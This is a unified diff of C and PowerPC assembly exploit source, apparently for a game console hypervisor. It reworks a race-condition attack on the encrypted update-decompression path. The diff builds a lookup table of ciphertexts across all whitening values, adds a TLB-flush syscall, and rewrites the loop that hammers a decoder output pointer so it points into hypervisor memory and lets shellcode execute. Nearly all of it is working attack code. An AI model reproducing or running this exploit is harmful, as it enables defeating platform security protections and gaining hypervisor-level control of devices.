@@ -1,5 +1,4 @@
 
-
 // Notes:
 //
 //  - NO GLOBAL VARIABLES!!! This code is executed from a RX section of memory, any attempt to write to this memory
@@ -64,7 +63,7 @@ typedef struct _STRING {
 #define HVX_ENCRYPTED_ENCRYPT_ALLOCATION        0x4A
 #define HVX_REVOKE_UPDATE                       0x65
 #define HVX_ARB_WRITE_SYSCALL                   0x21
-
+#define HVX_FLUSH_SINGLE_TB                     0x04
 
 // Drive mapping for exploit files:
 #define PAYLOAD_DRIVE           "PAYLOAD:"
@@ -182,6 +181,16 @@ static void __declspec(naked) HvxWriteByte(ULONG ordinal, ULONG address, ULONG s
     }
 }
 
+static void __declspec(naked) HvxFlushSingleTb(void *address)
+{
+    _asm
+    {
+        li      r0, HVX_FLUSH_SINGLE_TB
+        sc
+        blr
+    }
+}
+
 struct UPDATE_BUFFER_INFO
 {
     /* 0x00 */ ULONG TotalSize;                     // Total size of the update buffer, must match input param
@@ -195,7 +204,7 @@ struct UPDATE_BUFFER_INFO
     /* 0x34 */ ULONG ScratchBufferSize;             // Size of the scratch buffer
     /* 0x38 */ ULONG Buffer2Offset;                 // Offset of last buffer, not sure what the use is (final output buffer?)
     /* 0x3C */ ULONG Buffer2Size;                   // Size of last buffer
-    
+
     /* 0x60 */ //ULONG
     /* 0x64 */ //ULONG
 };
@@ -225,13 +234,20 @@ struct THREAD_ARGS
     BYTE* pScratchBuffer;
 };
 
+// Index bits of the ciphertext lookup pseudo-hashtable
+#define HASH_BITS 10
+
 struct CIPHER_TEXT_DATA
 {
     ULONGLONG dec_end_input_pos;
     ULONGLONG dec_output_buffer;        // New dec_output_buffer pointer (dst address for memcpy)
 
-    BYTE OracleData[16];                // Cipher text for the LZX decoder context header, used to detect when to start the race attack
-    BYTE DecOutputBufferData[16];       // Cipher text containing our malicious dec_output_buffer pointer (points to hypervisor memory) 
+    // Cipher texts for the LZX decoder context header, used to detect when to start the race attack
+    ULONGLONG canaries[1 << HASH_BITS];
+    // Cipher texts containing our malicious dec_output_buffer pointer (points to hypervisor memory)
+    // For a given detected header ciphertext, the corresponding replacement is determined by array index.
+    ULONGLONG replacements[1 << HASH_BITS];
+    ULONGLONG replacements2[1 << HASH_BITS];
 };
 
 /*
@@ -445,15 +461,11 @@ void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD S
 {
     BYTE *pMemoryAddress = (BYTE*)0x8D000000;
 
-    // Get the physical addresses of the buffers.
-    DWORD ScratchPhysAddr = MmGetPhysicalAddress(pCipherTextData);
-    DWORD BaseAddrPhys = MmGetPhysicalAddress(pUpdateData);
-
     // Scan all 1024 possible whitening bits.
     for (int i = 0; i < 1024; i++)
     {
         // Allocate encrypted memory.
-        DWORD result = HvxEncryptedReserveAllocation((DWORD)pMemoryAddress, BaseAddrPhys, UpdateDataSize);
+        DWORD result = HvxEncryptedReserveAllocation((DWORD)pMemoryAddress, MmGetPhysicalAddress(pUpdateData + ScratchOffset), 0x10000);
         if (result == FALSE)
         {
             DbgPrint("Failed to reserve encrypted memory 0x%08x\n", result);
@@ -470,41 +482,43 @@ void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD S
             VdDisplayFatalError(0x12400 | ERR_ENCRYPTED_COMMIT);
             return;
         }
+        // Need to manually flush the one _TLB entry_ corresponding to the encrypted allocation above.
+        // The HV just modifies the page table but does not invalidate the TLB entry in either
+        // "HvxEncryptedEncryptAllocation" or "HvxEncryptedReleaseAllocation".
+        // This means we might see the mapping (and whitening value) from the previous iteration if that did
+        // not age out from the TLB.
+        HvxFlushSingleTb(pMemoryAddress);
 
-        // Pick a random whitening value to target for the race attack.
-        if (i == 0x111)
-        {
-            // Get the cipher text for the expected header data in the LZX decoder context. This acts as our
-            // "oracle" to know when to start the race attack.
-            memset(pMemoryAddress + ScratchOffset, 0, 16);
-            *(ULONG*)(pMemoryAddress + ScratchOffset + 0) = 0x4349444c;     // signature = 'CIDL'
-            *(ULONG*)(pMemoryAddress + ScratchOffset + 4) = 0x8000;         // windows size = 0x8000
-            *(ULONG*)(pMemoryAddress + ScratchOffset + 8) = 1;              // cpu type = 1
-            __dcbst(ScratchOffset, pMemoryAddress);
+        // Get a cipher text for the expected header data in the LZX decoder context. This acts as a
+        // "oracle"/canary to know when to start the race attack.
+        memset(pMemoryAddress, 0, 16);
+        *(ULONG*)(pMemoryAddress + 0) = 0x4349444c;     // signature = 'CIDL'
+        *(ULONG*)(pMemoryAddress + 4) = 0x8000;         // windows size = 0x8000
+        *(ULONG*)(pMemoryAddress + 8) = 1;              // cpu type = 1
+        __dcbst(0, (char *) pMemoryAddress);
 
-            KeFlushCacheRange(pMemoryAddress + ScratchOffset, 0x80);
-            KeFlushCacheRange(pUpdateData + ScratchOffset, 0x80);
-            memcpy(pCipherTextData->OracleData, pUpdateData + ScratchOffset, 16);
+        KeFlushCacheRange(pMemoryAddress, 0x80);
+        KeFlushCacheRange(pUpdateData + ScratchOffset, 0x80);
 
-            // Get the cipher text for our malicious dec_output_buffer pointer which points to the hypervisor code we want to overwrite.
-            *(ULONGLONG*)(pMemoryAddress + ScratchOffset + 0x2B20) = pCipherTextData->dec_end_input_pos;        // dec_end_input_pos
-            *(ULONGLONG*)(pMemoryAddress + ScratchOffset + 0x2B28) = pCipherTextData->dec_output_buffer;        // dec_output_buffer
-            __dcbst(ScratchOffset + 0x2B00, pMemoryAddress);
+        ULONGLONG tmp = *(ULONGLONG *) (pUpdateData + ScratchOffset);
+        int idx = tmp >> (64 - HASH_BITS);
+        pCipherTextData->canaries[idx] = tmp;
 
-            KeFlushCacheRange(pMemoryAddress + ScratchOffset + 0x2B00, 0x80);
-            KeFlushCacheRange(pUpdateData + ScratchOffset + 0x2B00, 0x80);
-            memcpy(pCipherTextData->DecOutputBufferData, pUpdateData + ScratchOffset + 0x2B20, 16);
+        // Get the corresponding cipher text, with the same whitening value as above,
+        // for our malicious dec_output_buffer pointer which points to the hypervisor code we want to overwrite.
+        *(ULONGLONG*)(pMemoryAddress + 0x2B20) = pCipherTextData->dec_end_input_pos;
+        *(ULONGLONG*)(pMemoryAddress + 0x2B28) = pCipherTextData->dec_output_buffer;
+        __dcbst(0, (char *) pMemoryAddress + 0x2B00);
 
-            DbgPrint("Found cipher text for whitening 0x%04x: %08x%08x %08x%08x\n", i, *(DWORD*)pCipherTextData->OracleData, *(DWORD*)&pCipherTextData->OracleData[4], 
-                *(DWORD*)pCipherTextData->DecOutputBufferData, *(DWORD*)&pCipherTextData->DecOutputBufferData[4]);
-        }
+        KeFlushCacheRange(pMemoryAddress + 0x2B00, 0x80);
+        KeFlushCacheRange(pUpdateData + ScratchOffset + 0x2B00, 0x80);
+
+        pCipherTextData->replacements[idx] = *(ULONGLONG *) (pUpdateData + ScratchOffset + 0x2B20);
+        pCipherTextData->replacements2[idx] = *(ULONGLONG *) (pUpdateData + ScratchOffset + 0x2B28);
+
 
         // Free the encrypted allocation.
         result = HvxEncryptedReleaseAllocation((DWORD)pMemoryAddress);
-
-        // Bail out once we find the cipher text we want.
-        if (i == 0x111)
-            break;
     }
 }
 
@@ -579,7 +593,11 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
         memcpy(pArgs->pCompressedDataInBuffer, pArgs->pCompressedDataClean, pArgs->CompressedDataSize);
 
         // Execute the payload.
+        // Status is 0xc8000012 on miss, and 0xc8000006 on hit.
         DWORD result = HvxKeysExecute(pArgs->PayloadPhys, pArgs->PayloadSize, pArgs->UpdateDataPhys, pArgs->UpdateDataSize, NULL, NULL);
+        if (result != 0xc8000012) {
+            DbgPrint("XKE payload returned status %#x\n", result);
+        }
 
         // Flush cache on the cipher text pointers.
         __dcbf(0, pCipherTextPtr1);
@@ -646,12 +664,41 @@ DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
             SetLEDColor(LedColor);
             LedColor = ~LedColor & 0xFF;
         }
+        else
+        {
+            DbgPrint("."); // Race miss
+        }
+    }
+}
+
+static void CiphertextOverwriteLoop(void *pScratchPtr, CIPHER_TEXT_DATA *pCipherTextData)
+{
+    void *addr;
+    ULONGLONG *canaries, *replacements, *replacements2, tmp;
+
+    addr = pScratchPtr;
+    canaries = pCipherTextData->canaries;
+    replacements = pCipherTextData->replacements;
+    replacements2 = pCipherTextData->replacements2;
+
+    __dcbf(0, addr);
+
+    for (;;) {
+        tmp = *(ULONGLONG *) addr;
+        if (tmp != 0 && canaries[tmp >> (64 - HASH_BITS)] == tmp) {
+            for (int i = 0; i < 100000; i++) {
+                *(ULONGLONG *) ((char *) addr + 0x2B20) = replacements[tmp >> (64 - HASH_BITS)];
+                *(ULONGLONG *) ((char *) addr + 0x2B28) = replacements2[tmp >> (64 - HASH_BITS)];
+                __dcbst(0x2B20, addr);
+            }
+        }
+        __dcbf(0, addr);
     }
 }
 
 void __cdecl main()
 {
-    ULONG UpdateDataSize = 0x40000 + 0x80000;
+    ULONG UpdateDataSize = 0x40000 + 0x80000 + 0x10000;
     ULONG PayloadDataSize = 0x6000;
 
     BYTE* pCleanUpdateData = NULL;
@@ -706,16 +753,19 @@ void __cdecl main()
     memset(pUpdateData, 0, UpdateDataSize);
 
     // Setup cipher text parameters.
-    CIPHER_TEXT_DATA* pCipherTextInputData = (CIPHER_TEXT_DATA*)pCipherTextBuffer;
-    pCipherTextInputData->dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
-    pCipherTextInputData->dec_output_buffer = 0x8000010600030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET);
+    // This structure needs to be on the stack so that
+    // the lookup table is hot in cache.
+    CIPHER_TEXT_DATA CipherTextData;
+    memset(&CipherTextData, 0, sizeof CipherTextData);
+    CipherTextData.dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
+    CipherTextData.dec_output_buffer = 0x8000010600030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET);
 
     // Get the size of the decompressed update data.
     DWORD updateDataDecompressedSize = *(DWORD*)(pCleanUpdateData + 0x1C);
 
     DWORD outputOffset = PAGE_ALIGN_64K(CACHE_LINE_SIZE + CACHE_ALIGN(CleanUpdateDataSize));
-    DWORD scratchOffset = CACHE_ALIGN(outputOffset + CACHE_ALIGN(updateDataDecompressedSize));
-    BuildCipherTextLookupTable(pUpdateData, UpdateDataSize, scratchOffset, pCipherTextInputData);
+    DWORD scratchOffset = PAGE_ALIGN_64K(outputOffset + CACHE_ALIGN(updateDataDecompressedSize));
+    BuildCipherTextLookupTable(pUpdateData, UpdateDataSize, scratchOffset, &CipherTextData);
 
 
     // Initialize update data.
@@ -728,7 +778,7 @@ void __cdecl main()
     pUpdateInfo->UpdateDataSize = CACHE_ALIGN(CleanUpdateDataSize);
     pUpdateInfo->OutputBufferOffset = PAGE_ALIGN_64K(pUpdateInfo->UpdateDataOffset + pUpdateInfo->UpdateDataSize);
     pUpdateInfo->OutputBufferSize = CACHE_ALIGN(updateDataDecompressedSize);
-    pUpdateInfo->ScratchBufferOffset = CACHE_ALIGN(pUpdateInfo->OutputBufferOffset + pUpdateInfo->OutputBufferSize);
+    pUpdateInfo->ScratchBufferOffset = PAGE_ALIGN_64K(pUpdateInfo->OutputBufferOffset + pUpdateInfo->OutputBufferSize);
     pUpdateInfo->ScratchBufferSize = 0x20000;
     pUpdateInfo->Buffer2Offset = CACHE_ALIGN(pUpdateInfo->ScratchBufferOffset + pUpdateInfo->ScratchBufferSize);
     pUpdateInfo->Buffer2Size = 0x10000;
@@ -778,7 +828,7 @@ void __cdecl main()
     ThreadArgs.ScratchDataOffset = pUpdateInfo->ScratchBufferOffset;
     ThreadArgs.ScratchDataSize = pUpdateInfo->ScratchBufferSize;
 
-    ThreadArgs.HvCheckAddress = pCipherTextInputData->dec_output_buffer;
+    ThreadArgs.HvCheckAddress = CipherTextData.dec_output_buffer;
     ThreadArgs.ShellCodePhysAddress = ShellCodePhys;
 
     // Save the scratch pointer, we can't access pUpdateInfo from here on out because it'll be moved to protected memory by the hv.
@@ -800,61 +850,8 @@ void __cdecl main()
     DWORD dfsddf = XSetThreadProcessor(hXKEWorkerThread, 1);
     ResumeThread(hXKEWorkerThread);
 
-hammer_time:
-
-    // Preload values for the oracle and malicious cipher text used in the attack loop.
-    ULONGLONG ScratchCipherTextValue = *(ULONGLONG*)&pCipherTextInputData->OracleData[0];
-    ULONGLONG DecOutputBufferDataVal1 = *(ULONGLONG*)&pCipherTextInputData->DecOutputBufferData[0];
-    ULONGLONG DecOutputBufferDataVal2 = *(ULONGLONG*)&pCipherTextInputData->DecOutputBufferData[8];
-
-    int loopCount = 100000;
-
-#ifdef STATIC_WHITENING
-
-    while (true)
-    {
-        *(ULONGLONG*)(pScratchPtr + 0x2B20) = DecOutputBufferDataVal1;
-        *(ULONGLONG*)(pScratchPtr + 0x2B28) = DecOutputBufferDataVal2;
-        __dcbst(0x2B20, pScratchPtr);
-    }
-
-#endif
-
-    
-    _asm
-    {
-        // Preload registers with all the data we'll need during the attack loop. We want to minimize
-        // any additional operations done to make the loop as tight as possible.
-        mr      r31, pScratchPtr
-        mr      r30, ScratchCipherTextValue
-        mr      r29, DecOutputBufferDataVal1
-        mr      r28, DecOutputBufferDataVal2
-        addi    r26, r31, 0x2B00
-        mr      r25, loopCount
-
-loop:
-        // Check the cipher text in the scratch buffer and see if it matches the oracle data we computed.
-        ld      r11, 0(r31)
-        cmpld   cr6, r11, r30
-        bne     cr6, flush
-
-            // Cipher text matches the oracle data, begin the attack and hammer the dec_output_buffer pointer
-            // with the cipher text for our malicious pointer.
-            mtctr   r25
-
-overwrite:
-            std     r29, 0x20(r26)
-            std     r28, 0x28(r26)
-            dcbst   r0, r26
-            bdnz    overwrite
-
-flush:
-
-        // Flush cache on the scratch buffer so the next time we check the cipher text we fetch the data from main memory.
-        dcbf    r0, r31
-        b       loop
-end:
-    }
+    // Run ciphertext overwrite loop on HW thread 0.
+    CiphertextOverwriteLoop(pScratchPtr, &CipherTextData);
 
     // Should never make it here.
     DbgBreakPoint();
